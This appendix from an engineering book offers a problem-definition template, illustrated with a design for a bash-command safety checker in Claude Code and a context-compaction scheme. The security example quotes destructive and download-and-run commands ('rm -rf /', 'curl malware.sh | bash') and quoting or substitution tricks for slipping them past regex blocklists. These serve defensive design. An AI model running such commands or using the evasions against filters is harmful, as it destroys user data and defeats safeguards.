Appendix A: The Problem Definition Template

Most engineering failures are not implementation failures. They are problem definition failures. The code did exactly what the specification said --- the specification was wrong. Or incomplete. Or ambiguous in a way nobody noticed until production.

This appendix provides a practical template for defining engineering problems before solving them. It is not a bureaucratic exercise. It is a thinking tool that forces you to confront ambiguity, discover constraints, and specify success criteria before you write the first line of code. Used consistently, it catches requirement bugs weeks before they become production bugs.

The Template

1. Context

What situation led to this problem existing? What system is affected? Who is affected? Why does it matter now?

Two to three sentences of background. Not a history lesson --- just enough context that someone unfamiliar with the system can understand why this problem matters. If you cannot explain the context in three sentences, you do not understand the problem well enough to solve it.

2. Problem Statement

What specific thing is wrong, missing, or suboptimal? Describe the observable symptoms, not the imagined root cause.

One to two sentences that a non-expert could understand. The discipline here is separating what you observe (symptoms) from what you believe is happening (diagnosis). "Users report 500 errors on the login endpoint" is a problem statement. "The database connection pool is exhausted" is a diagnosis --- it might be wrong.

3. Constraints

What limitations shape the solution space? What CAN'T you do?

List every constraint explicitly. Constraints fall into categories:

  • Time: "Must ship by Friday." "Cannot exceed 400ms latency."
  • Compatibility: "Must not break existing API clients." "Must work on Node 18+."
  • Safety: "Must not expose user credentials." "Must maintain audit trail."
  • Resources: "No new dependencies." "Must run on 512MB containers."
  • Organizational: "Cannot modify the auth service (owned by another team)."

The most important constraints are the ones you discover last. Spend extra time here.

4. Success Criteria

How will you know the problem is solved? Define measurable outcomes.

Each criterion should be testable. "The system is faster" is not a criterion. "P99 latency is under 200ms for the login endpoint" is. "The code is cleaner" is not a criterion. "The module has zero circular dependencies and all public functions have type signatures" is.

Write three to five criteria. If you cannot define success, you cannot verify it.

5. Failure Modes

What happens if the solution is wrong, partial, or breaks something else?

List the three most likely failure modes and their blast radius. For each: - What breaks? - Who is affected? - How would you detect it? - How would you roll back?

This section forces you to think about failure before it happens. It is the cheapest insurance in engineering.

6. Trade-offs

What are you explicitly choosing to optimize for, and what are you accepting as a cost?

Every solution involves trade-offs. Make them explicit:

  • "Optimizing for latency at the cost of increased memory usage."
  • "Choosing simplicity over extensibility --- this module handles one case, not all cases."
  • "Accepting eventual consistency to avoid distributed locking."

Unstated trade-offs become surprises later. Stated trade-offs become design rationale.

7. Decision Record

What alternatives were considered? Why was each rejected?

List two to three alternatives and the reason each was not chosen. This serves two purposes: it proves you considered more than one approach, and it prevents future engineers from re-evaluating rejected options without understanding why they were rejected.

Filled Example: Claude Code's Bash Command Security

1. Context

Claude Code executes bash commands on behalf of users. The agent generates commands based on user instructions and runs them through a Bash tool. A malicious prompt or a model error could generate destructive commands (rm -rf /, curl malware.sh | bash) that damage the user's system.

2. Problem Statement

There is no systematic way to determine whether a bash command is safe to execute before executing it. The current approach (a short blocklist of known-dangerous commands) misses obfuscated variants and novel attack patterns, while also blocking legitimate commands that happen to match patterns superficially.

3. Constraints

  • Latency: The safety check must complete in under 50ms. Users will not tolerate perceptible delay on every command.
  • Accuracy: False negatives (allowing dangerous commands) are unacceptable --- a single miss could destroy a user's file system. False positives (blocking safe commands) must be under 5% of legitimate usage.
  • Compatibility: Must handle all POSIX shell syntax: pipes, redirections, command substitution, process substitution, heredocs, quoting, escaping, and command chaining (&&, ||, ;).
  • No network dependency: The check must work offline. Cannot call an external API for classification.
  • Maintainability: New patterns must be addable without rewriting the analyzer. Security evolves; the system must evolve with it.

4. Success Criteria

  1. All 47 known command injection patterns from the CWE-78 database are correctly identified as dangerous.
  2. P99 latency of the safety check is under 20ms for commands up to 10,000 characters.
  3. False positive rate on a corpus of 10,000 legitimate developer commands is under 2%.
  4. The analyzer correctly handles all shell syntax in the POSIX specification, including edge cases (nested quoting, escaped newlines, heredocs within command substitution).
  5. Adding a new dangerous pattern requires changing one file and adding one test.

5. Failure Modes

Failure Mode Blast Radius Detection Rollback
False negative: dangerous command passes safety check User's file system damaged, data loss Post-incident report, cannot prevent Cannot undo file deletion. Mitigation: user backup recommendations.
False positive: safe command blocked User frustration, workflow interruption User feedback, telemetry on blocked commands User can override with explicit approval in permission settings.
Parser crash on malformed input Command execution blocked (fail-closed) Error logging, unit test coverage Graceful degradation: fall back to pattern matching for unparseable input.
Performance regression: check exceeds 50ms Perceptible delay on every command Latency monitoring, P99 dashboards Timeout: if check exceeds 50ms, skip advanced analysis and use fast-path pattern check only.

6. Trade-offs

  • Full parser over regex matching: Choosing correctness over simplicity. A full shell parser is 4,400 lines of code compared to ~200 lines for a regex-based approach. But the regex approach cannot handle quoting, escaping, or command substitution --- exactly the mechanisms an attacker would use.
  • Fail-closed over fail-open: If the parser cannot analyze a command, it blocks it and asks the user. This means parser bugs cause false positives, not false negatives. Users see unnecessary prompts rather than experiencing unblocked attacks.
  • AST analysis over machine learning: The security check uses deterministic AST analysis, not an ML classifier. This sacrifices potential accuracy improvements from ML but guarantees that the check is explainable, reproducible, and free of training data biases. A security boundary should not depend on a model that might be wrong.

7. Decision Record

Alternative 1: Regex blocklist. A list of regular expressions matching dangerous patterns. Rejected because shell syntax is not a regular language. rm -rf / can be written as r"m" -r"f" /, as $(echo rm) -rf /, as eval "rm -rf /", and in dozens of other forms that regex matching cannot cover without an exponentially growing pattern list.

Alternative 2: Sandbox execution. Run every command in a sandboxed environment (Docker, nsjail) and check for dangerous side effects. Rejected because it adds 500ms-2s of latency per command (container startup), requires Docker as a dependency, and does not work for commands that need access to the user's actual file system (which is most commands in a development workflow).

Alternative 3: LLM classification. Send the command to a fast model with the prompt "Is this command dangerous?" Rejected because it adds network latency, costs money per check, requires the LLM to understand shell syntax (which models do inconsistently), and creates a non-deterministic security boundary where the same command might be classified differently on consecutive runs.

Chosen approach: Full shell parser with layered analysis. Parse the command into an AST using a grammar-based parser. Run the AST through five analysis layers: pattern blocklist (fast rejection), structural analysis (command chaining, substitution detection), path analysis (sensitive targets), permission rules (user configuration), and user confirmation (uncertain cases). Defense in depth ensures that a bypass at one layer is caught by another.

Using the Template

The template works best when filled out before implementation begins and reviewed with at least one other engineer. Common failure modes in using the template:

Skipping the constraints section. Engineers eager to start coding rush past constraints and discover them during implementation. Every constraint discovered after coding starts potentially invalidates work already done.

Confusing symptoms with diagnosis in the problem statement. "The database is slow" is a diagnosis. "Queries to the users table take 8 seconds under load" is a problem statement. Premature diagnosis narrows the solution space before you understand the problem.

Writing success criteria that are not testable. "The system should be reliable" cannot be verified. "The system should maintain 99.9% uptime over a 30-day rolling window, measured by the health check endpoint" can.

Listing only one alternative in the decision record. If you only considered one approach, you did not engineer --- you guessed. The discipline of evaluating alternatives is where the best designs emerge.

The template fits on one page. The thinking it forces does not. That is the point.

A Second Example: Context Window Management

To show the template working on a different class of problem, here is a condensed example from a non-security domain.

1. Context

Claude Code's conversation history grows with every turn. After 15-20 turns, the accumulated messages approach the model's 200,000-token context window limit. When the limit is reached, the session must end, discarding all accumulated context and forcing the user to start over.

2. Problem Statement

Long conversations terminate abruptly when the context window fills, losing all context and progress. Users working on complex multi-step tasks (debugging, refactoring, multi-file implementation) consistently hit this limit and lose 10-20 minutes of accumulated context.

3. Constraints

  • Coherence: Compacted conversations must remain coherent. The model must understand what happened in earlier turns even if the verbatim messages are removed.
  • Preservation: Recent turns (last 5-10 messages) must be preserved verbatim. The model needs exact context for its current reasoning.
  • Cost: Compaction must not exceed $0.10 per invocation. Running a separate summarization call is acceptable but must be bounded.
  • Latency: Compaction must complete in under 30 seconds. Longer pauses disrupt the user's workflow.
  • Transparency: Users must know when compaction occurs and what information was preserved versus summarized.

4. Success Criteria

  1. Sessions can run for 50+ turns without termination.
  2. Task completion rate after compaction is within 10% of pre-compaction rate.
  3. Users report that the agent "remembers" key decisions, file paths, and error messages from earlier turns.
  4. Compaction cost averages under $0.05 per invocation.
  5. Compaction latency is under 15 seconds at P95.

5. Failure Modes

Failure Mode Blast Radius Detection Rollback
Compaction drops critical context (file paths, decisions) Agent produces wrong answers, user must re-explain User reports "the agent forgot what we were doing" Manual compaction with /compact [topic] to preserve specific context
Compaction summarization hallucinates Agent acts on incorrect summary of earlier turns Comparison of pre/post compaction behavior on eval tasks Revert to original conversation if stored
Compaction triggers too aggressively Unnecessary information loss, wasted cost Monitor compaction frequency per session Increase the threshold from 80% to 90%

6. Trade-offs

  • Lossy over lossless: Compaction necessarily loses information. Optimizing for retention of recent context over old context. Accepting that the agent may not recall exact code from turn 3 when it is on turn 25.
  • Model-based summarization over algorithmic truncation: Using the model itself to summarize creates the best summaries but adds cost and latency. Simple truncation (dropping old messages) would be free but loses critical context.
  • Automatic triggering over manual only: Compacting automatically at 80% capacity prevents abrupt session death but removes user control over timing. Manual-only compaction would give control but users forget and sessions die.

7. Decision Record

Alternative 1: Sliding window. Drop the oldest N messages when the window fills. Rejected because it loses context indiscriminately --- a critical error message from turn 2 is discarded alongside irrelevant small talk from turn 3.

Alternative 2: Hierarchical summarization. Summarize every 5 turns into a paragraph, then summarize every 5 paragraphs into a sentence. Rejected because the fixed summarization intervals do not align with task boundaries. A 5-turn summary might split a debugging session in half.

Chosen approach: Priority-based compaction. Preserve the system prompt and recent N turns verbatim. Summarize all older turns in a single model call, with instructions to preserve: file paths, decisions made, errors encountered, and task progress. Trigger at 80% capacity. Allow manual trigger with /compact [focus] for user-directed preservation.

Adapting the Template

The template is a starting point, not a straitjacket. Adapt it to your team's needs:

  • For small problems (single function, one-day fix): Context, Problem Statement, and Success Criteria may be sufficient. Skip the full Decision Record.
  • For large problems (new subsystem, multi-week effort): Expand the Decision Record into a full design document with architecture diagrams, data flow analysis, and prototype results.
  • For security problems: Add an explicit "Threat Model" section between Constraints and Success Criteria, listing the attack vectors the solution must defend against.
  • For performance problems: Add a "Measurement Plan" section after Success Criteria, specifying the benchmarks, workloads, and profiling tools that will verify the criteria.

The template's value is not in the document it produces. It is in the thinking it forces. A team that fills out this template before starting work will discover constraints earlier, define success more precisely, and consider more alternatives than a team that jumps straight to implementation. That discovery process, not the document, is what prevents requirement bugs from becoming production outages.
